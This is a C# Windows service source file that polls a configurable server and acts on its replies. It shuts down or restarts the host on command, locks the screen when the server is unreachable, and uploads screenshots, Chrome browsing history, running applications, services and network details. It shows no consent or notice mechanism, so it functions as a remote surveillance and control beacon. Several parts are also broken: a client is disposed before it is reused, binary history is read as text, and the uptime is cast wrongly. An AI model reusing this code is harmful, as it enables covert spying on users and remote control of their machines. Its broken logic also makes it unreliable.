using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.ServiceProcess;
using System.Timers;
using log4net;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text;
using System.Configuration;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Linq;

namespace calisto
{
    public partial class calisto : ServiceBase
    {
		// Constant variables
		int timerInterval = int.Parse(ConfigurationManager.AppSettings["TimerInterval"]);

		// Timer to make the HTTP request to the API
		private System.Timers.Timer timer;

        // Logger instance
        private static readonly ILog log = LogManager.GetLogger(typeof(calisto));

        // Cache for the system status data
        private SystemStatus systemStatusCache;

        public calisto()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
			// Load log4net configuration
			log4net.Config.XmlConfigurator.Configure();
			// Initialize the timer
			timer = new System.Timers.Timer();
			timer.Interval = timerInterval;
			timer.Elapsed += new ElapsedEventHandler(OnTimer);
            timer.Start();
			//Log that service has started
			log.Info("Calisto Windows Service started");
		}

        protected override void OnStop()
        {
            // Stop the timer
            timer.Stop();

			//Shutdown the log4net
			LogManager.Shutdown();
		}

		private async Task<(string, HttpClient)> MakeApiRequestAsync(string apiUrl, int retries)
		{
			// Set a flag to indicate whether the request was successful
			bool success = false;

			// Initialize the client variable
			HttpClient client = null;

			// Loop until the request is successful or the maximum number of retries is reached
			while (!success && retries > 0)
			{
				try
				{
					// Create a new HttpClient instance
					client = new HttpClient();

					// Call the API and get the response
					HttpResponseMessage response = await client.GetAsync(apiUrl);
					string responseString = await response.Content.ReadAsStringAsync();

					// Set the success flag to true
					success = true;

					// Return the response and client
					return (responseString, client);
				}
				catch (HttpRequestException ex)
				{
					// Log the exception message
					log.Error($"An error occurred while making the HTTP request to the API: {ex.Message}");

					// Decrement the number of retries
					retries--;
				}
				catch (Exception ex)
				{
					// Log the exception message
					log.Error($"An unexpected error occurred while making the HTTP request to the API: {ex.Message}");

					// Set the success flag to false
					success = false;
				}
				finally
				{
					// Dispose of the HttpClient instance if it was created
					if (client != null)
					{
						client.Dispose();
					}
				}
			}

			// If the request was not successful after the maximum number of retries, return an empty string and null client
			return ("", null);
		}

		private async Task<bool> HandleApiResponseAsync(HttpClient client, string primaryApiUrl, string response)
		{
            // Check the response

            //If the respoinse is shutdown to shutdown the host
            if (response.Trim().ToLower() == "shutdown")
            {
                ShutDown();
                return true;
            }
			//If the respoinse is Restart to restart the host
			else if (response.Trim().ToLower() == "restart")
			{
				Restart();
				return true;
			}
			// if the response is data return JSON with data about host
			else if (response.Trim().ToLower() == "data")
            {
                // Get the current system status
                var systemStatus = GetSystemStatus();

                // Serialize the system status object to a JSON string using Newtonsoft.Json
                var json = Newtonsoft.Json.JsonConvert.SerializeObject(systemStatus);

                // Send the JSON string back to the server
                HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(primaryApiUrl, content);
                return true;
            }

            // If the response is something else, return false
            else
            {
                return false;
            }
		}

		private async void OnTimer(object sender, ElapsedEventArgs e)
		{
			// Set the number of retries
			int maxRetries = int.Parse(ConfigurationManager.AppSettings["MaxRetries"]);

			// Set the primary and fallback API URLs
			string primaryApiUrl = ConfigurationManager.AppSettings["PrimaryApiUrl"];
			string fallbackApiUrl = ConfigurationManager.AppSettings["FallbackApiUrl"];

			// Make the HTTP request to the primary API
			(string response, HttpClient client) = await MakeApiRequestAsync(primaryApiUrl, maxRetries);

			// If the response is empty, try the fallback API
			if (string.IsNullOrEmpty(response))
			{
				(response, client) = await MakeApiRequestAsync(fallbackApiUrl, maxRetries);
			}

			// If the response is not empty, handle the response
			if (!string.IsNullOrEmpty(response))
			{
				// Handle the API response
				bool handled = await HandleApiResponseAsync(client, primaryApiUrl, response);

				// If the response was not handled, log a warning
				if (!handled)
				{
					log.Warn($"Received an unexpected response from the API: {response}");
				}
			}
			else
			{
				// Log a warning if the request to both the primary and fallback APIs failed
				log.Warn("Failed to make the HTTP request to the API, locking host!");

				//Lock the screen if API call was unsuccessful to either endpoint
				LockScreen();
			}
		}


		private SystemStatus GetSystemStatus()
        {
            // Check if the system status cache is still valid
            if (systemStatusCache != null && (DateTime.Now - systemStatusCache.Time).TotalMilliseconds < timerInterval)
            {
                // Return the cached system status
                return systemStatusCache;
            }

            // Create a new SystemStatus object
            var systemStatus = new SystemStatus();

            // Get the current CPU load
            systemStatus.CpuLoad = GetCpuLoad();

            // Get the current memory usage
            systemStatus.MemoryUsage = GetMemoryUsage();

            // Get the current system time
            systemStatus.Time = DateTime.Now;

            // Get a screenshot of the current screen
            systemStatus.Screenshot = GetScreenshot();

            // Get a list of applications running on the system
            systemStatus.Apps = GetRunningApplications();

			// Get a Chrome history file
			systemStatus.ChromeHistory = GetChromeHistoryAsync().Result;

			// Get System uptime
			systemStatus.Uptime = GetSystemUptime();

			// Get System disk usage
			systemStatus.DiskUsage = GetDiskUsage();

			// Get System services
			systemStatus.Services = GetHostServices();

			// Get System services
			systemStatus.IpInfo = GetIpInfo();

			// Update the system status cache
			systemStatusCache = systemStatus;

            return systemStatus;
        }

        private double GetCpuLoad()
        {
            // Use a PerformanceCounter to get the current CPU load
            try
            {
                using (PerformanceCounter pc = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    // Get the next value for the counter
                    pc.NextValue();

                    // Wait for 1 second
                    System.Threading.Thread.Sleep(1000);

                    // Get the next value for the counter again
                    return pc.NextValue();
                }
            }
            catch (Exception ex)
            {
                // An error occurred while getting the CPU load
                // Log the exception and return 0
                log.Error($"An error occurred while getting the CPU load: {ex.Message}", ex);
                return 0;
            }
        }

        private double GetMemoryUsage()
        {
            try
            {
                // Get the current physical memory usage
                ulong totalMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;

                // Get the current available physical memory
                ulong availableMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().AvailablePhysicalMemory;

                // Calculate the memory usage
                double memoryUsage = (totalMemory - availableMemory) / (double)totalMemory;

                return memoryUsage;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the memory usage
                // Log the exception and return 0
                log.Error($"An error occurred while getting the memory usage: {ex.Message}", ex);
                return 0;
            }
        }

        private byte[] GetScreenshot()
        {
            try
            {
                // Create a bitmap of the current screen
                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap
                Graphics graphics = Graphics.FromImage(screenshot);

                // Copy the screen to the graphics object
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                // Save the screenshot to a temporary file
                string filePath = Path.GetTempFileName() + ".png";
                screenshot.Save(filePath, ImageFormat.Png);

                // Read the screenshot from the temporary file
                byte[] screenshotData = File.ReadAllBytes(filePath);

                // Delete the temporary file
                File.Delete(filePath);

                return screenshotData;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the screenshot
                // Log the exception and return an empty array
                log.Error($"An error occurred while getting the screenshot: {ex.Message}", ex);
                return new byte[0];
            }
        }
		private List<Application> GetRunningApplications()
		{
			// Create a list to store the running applications
			var runningApplications = new List<Application>();

			// Get a list of all running processes
			Process[] processes = Process.GetProcesses();

			// Iterate through the processes
			foreach (Process process in processes)
			{
				try
				{
					// Check if the process is running in the foreground
					if (process.MainWindowHandle != IntPtr.Zero)
					{
						// Get the process name and ID
						string processName = process.ProcessName;
						int processId = process.Id;

						// Check if the process name is not empty
						if (!string.IsNullOrEmpty(processName))
						{
							// Create a new Application object
							var application = new Application
							{
								Name = processName,
								Id = processId,
								StartTime = process.StartTime
							};

							// Add the application to the list
							runningApplications.Add(application);
						}
					}
				}
				catch (Exception ex)
				{
					// An error occurred while getting the process name
					// Log the exception
					log.Error($"An error occurred while getting the process name: {ex.Message}", ex);
				}
			}

			return runningApplications;
		}

		private async Task<List<string>> GetChromeHistoryAsync()
		{
			// Create a list to store the history data
			List<string> history = new List<string>();

			// Get the path to the Chrome history file
			string historyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\History");

			// Read the history file
			using (StreamReader reader = new StreamReader(historyPath))
			{
				// Skip the first line
				await reader.ReadLineAsync();

				// Read each line of the file and add it to the list
				while (!reader.EndOfStream)
				{
					history.Add(reader.ReadLine());
				}
			}

			// Return the list of history data
			return history;
		}

		public IpInfo GetIpInfo()
		{
			// Create a new IpInfo instance to store the IP information
			var ipInfo = new IpInfo();

			// Try to get the LAN IP
			try
			{
				ipInfo.LanIp = GetLanIp();
			}
			// If an exception is thrown, log the error and continue execution
			catch (Exception ex)
			{
				log.Error("Error getting LAN IP: " + ex.Message);
			}

			// Try to get the public IP
			try
			{
				// Use a WebClient to download the public IP from a website that displays it
				ipInfo.PublicIp = new WebClient().DownloadString("https://icanhazip.com");
			}
			// If an exception is thrown, log the error and continue execution
			catch (Exception ex)
			{
				log.Error("Error getting public IP: " + ex.Message);
			}

			// Try to get the DNS
			try
			{
				ipInfo.Dns = Dns.GetHostEntry("").HostName;
			}
			// If an exception is thrown, log the error and continue execution
			catch (Exception ex)
			{
				log.Error("Error getting DNS: " + ex.Message);
			}

			// Try to get the default gateway
			try
			{
				// Use the System.Management namespace to get the default gateway
				using (var managementClass = new System.Management.ManagementClass("Win32_NetworkAdapterConfiguration"))
				using (var managementObjectCollection = managementClass.GetInstances())
				{
					foreach (var managementObject in managementObjectCollection)
					{
						if ((bool)managementObject["IPEnabled"])
						{
							ipInfo.DefaultGateway = (string)managementObject["DefaultIPGateway"];
							break;
						}
					}
				}
			}
			// If an exception is thrown, log the error and continue execution
			catch (Exception ex)
			{
				log.Error("Error getting default gateway: " + ex.Message);
			}

			try
			{
				// Use a ManagementObjectSearcher to get the data usage information
				var managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PerfRawData_Tcpip_NetworkInterface");
				foreach (var managementObject in managementObjectSearcher.Get())
				{
					ipInfo.DataTransmitted = (long)managementObject["BytesTotalPersec"];
					ipInfo.DataReceived = (long)managementObject["BytesReceivedPersec"];
				}
			}
			// If an exception is thrown, log the error and continue execution
			catch (Exception ex)
			{
				log.Error("Error getting data usage: " + ex.Message);
			}
			return ipInfo;
		}
		public string GetLanIp()
		{
			// Try to get the LAN IP
			try
			{
				// Use the System.Net namespace to get the host name and address list
				var host = Dns.GetHostEntry(Dns.GetHostName());
				foreach (var ip in host.AddressList)
				{
					// Check if the address is an IPv4 address
					if (ip.AddressFamily == AddressFamily.InterNetwork)
					{
						// Return the IP address if it is an IPv4 address
						return ip.ToString();
					}
				}
				// Throw an exception if no LAN IP was found
				throw new Exception("No LAN IP found");
			}
			// If an exception is thrown, log the error and rethrow it
			catch (Exception ex)
			{
				log.Error("Error getting LAN IP: " + ex.Message);
				throw;
			}
		}
		public TimeSpan GetSystemUptime()
		{
			try
			{
				// Use the System.Management namespace to get the system uptime
				using (var managementClass = new ManagementClass("Win32_OperatingSystem"))
				using (var managementObjectCollection = managementClass.GetInstances())
				{
					foreach (var managementObject in managementObjectCollection)
					{
						// Convert the uptime from ticks to a TimeSpan and return it
						return TimeSpan.FromTicks((long)managementObject["LastBootUpTime"]);
					}
				}
			}
			catch (Exception ex)
			{
				// Log the error and return a TimeSpan of zero
				log.Error("Error getting system uptime: " + ex.Message);
				return TimeSpan.Zero;
			}

			// Return a default TimeSpan of zero if the foreach loop did not execute
			return TimeSpan.Zero;
		}

		public List<Service> GetHostServices()
		{
			try
			{
				// Use the System.Management namespace to get the host services
				using (var managementClass = new ManagementClass("Win32_Service"))
				using (var managementObjectCollection = managementClass.GetInstances())
				{
					var services = new List<Service>();

					// Iterate through the collection of management objects
					foreach (var managementObject in managementObjectCollection)
					{
						// Create a Service instance for each management object
						var service = new Service
						{
							Name = (string)managementObject["Name"],
							DisplayName = (string)managementObject["DisplayName"],
							Description = (string)managementObject["Description"],
							Status = (string)managementObject["State"],
							StartupType = (string)managementObject["StartMode"],
							PathToExecutable = (string)managementObject["PathName"],
							AccountName = (string)managementObject["StartName"]
						};

						// Add the Service instance to the list
						services.Add(service);
					}

					// Log the number of services found
					log.Info($"Found {services.Count} services");

					// Return the list of Service instances
					return services;
				}
			}
			catch (Exception ex)
			{
				// Log the error and return an empty list
				log.Error("Error getting host services: " + ex.Message);
				return new List<Service>();
			}
		}

		public List<DiskUsage> GetDiskUsage()
		{
			try
			{
				// Use the System.Management namespace to get the disk usage
				using (var managementClass = new ManagementClass("Win32_LogicalDisk"))
				using (var managementObjectCollection = managementClass.GetInstances())
				{
					var disks = new List<DiskUsage>();

					// Iterate through the collection of management objects
					foreach (var managementObject in managementObjectCollection)
					{
						// Create a DiskUsage instance for each management object
						var disk = new DiskUsage
						{
							Name = (string)managementObject["Name"],
							TotalSize = (long)managementObject["Size"],
							AvailableSpace = (long)managementObject["FreeSpace"]
						};

						// Add the DiskUsage instance to the list
						disks.Add(disk);
					}

					// Return the list of DiskUsage instances
					return disks;
				}
			}
			catch (Exception ex)
			{
				// Log the error and return an empty list
				log.Error("Error getting disk usage: " + ex.Message);
				return new List<DiskUsage>();
			}
		}

		public static string[] GetOpenedUrlsInChrome()
		{
			// Create a hash set to store the URLs
			// By using a hash set, we can eliminate the need to check
			// if a URL has already been added to the list, since
			// a hash set does not allow duplicate values. This means
			// that we can remove the if statement inside the foreach loop,
			// which should make the code more efficient.
			var openedUrls = new HashSet<string>();

			try
			{
				// Get a list of all processes with the name "chrome"
				var chromeProcesses = Process.GetProcessesByName("chrome");

				// Check if any processes were found
				if (chromeProcesses.Length > 0)
				{
					// Chrome is running, so we can proceed to retrieve the URLs

					// Iterate through each process
					foreach (var process in chromeProcesses)
					{
						// Get the main window title of the process
						string windowTitle = process.MainWindowTitle;

						// Check if the window title is not empty
						if (!string.IsNullOrEmpty(windowTitle))
						{
							// The window title will contain the URL at the end, so we can retrieve it by splitting the string
							string[] parts = windowTitle.Split('-');

							// The URL will be the last part, so we can retrieve it using the Last() method
							string url = parts.Last().Trim();

							// Add the URL to the hash set
							openedUrls.Add(url);
						}
					}
				}
				else
				{
					// Chrome is not running, so we can't retrieve the URLs
					log.Warn("Chrome is not running.");
				}
			}
			catch (Exception ex)
			{
				// Log the error message using log4net
				log.Error("Error retrieving opened URLs in Chrome: " + ex.Message, ex);
			}

			// Return the hash set of URLs as an array
			return openedUrls.ToArray();
		}

		private void ShutDown()
        {
            // Shut down the host
            System.Diagnostics.Process.Start("shutdown.exe", "/s /t 0");
        }
		private void Restart()
		{
			// Restarts down the host
			System.Diagnostics.Process.Start("shutdown.exe", "/r /t 0");
		}

		private void LockScreen()
		{
			// Get the current user and the interactive session id
			var currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
			var currentSessionId = Process.GetCurrentProcess().SessionId;

			// Lock the screen
			Process.Start("rundll32.exe", $"user32.dll,LockWorkStation");
		}

		// Inner class to represent the system status
		public class SystemStatus
		{
			public double CpuLoad { get; set; }
			public double MemoryUsage { get; set; }
			public DateTime Time { get; set; }
			public byte[] Screenshot { get; set; }
			public List<Application> Apps { get; set; }
			public List<string> ChromeHistory { get; set; }
			public TimeSpan Uptime { get; set; }
			public List<DiskUsage> DiskUsage { get; set; }
			public List<Service> Services { get; set; }
			public IpInfo IpInfo { get; set; }
		}

		// Inner class to represent the IP information
		public class IpInfo
		{
			public string LanIp { get; set; }
			public string PublicIp { get; set; }
			public string Dns { get; set; }
			public string DefaultGateway { get; set; }
			public long DataTransmitted { get; set; }
			public long DataReceived { get; set; }
		}

		// Inner class to represent the system Disk Usage
		public class DiskUsage
		{
			public string Name { get; set; }
			public long TotalSize { get; set; }
			public long AvailableSpace { get; set; }
		}

		// Inner class to represent the system services
		public class Service
		{
			public string Name { get; set; }
			public string DisplayName { get; set; }
			public string Description { get; set; }
			public string Status { get; set; }
			public string StartupType { get; set; }
			public string PathToExecutable { get; set; }
			public string AccountName { get; set; }
		}

		// Inner class to represent an application
		public class Application
        {
            public string Name { get; set; }
            public int Id { get; set; }
            public DateTime StartTime { get; set; }
        }
    }
}